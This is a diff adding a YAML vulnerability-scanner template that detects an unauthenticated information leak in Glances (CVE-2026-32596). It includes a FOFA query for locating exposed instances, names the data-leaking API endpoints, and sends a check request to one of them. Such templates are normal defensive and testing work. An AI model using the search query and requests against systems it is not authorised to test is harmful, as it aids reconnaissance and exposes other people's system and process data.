@@ -1,0 +1,28 @@
+id: glances-system-info-leak
+
+info:
+  name: "glances 接口敏感信息泄露"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: icon_hash="840398323"
+    该漏洞导致 glances 系统敏感信息泄露。攻击者可通过访问以下接口获取系统状态数据：
+    GET /api/4/all HTTP/1.1
+    GET /api/4/processlist HTTP/1.1
+  reference:
+  - CVE-2026-32596
+  tags: glances
+
+http:
+- raw:
+  - |
+    GET /api/4/system HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'os_name'
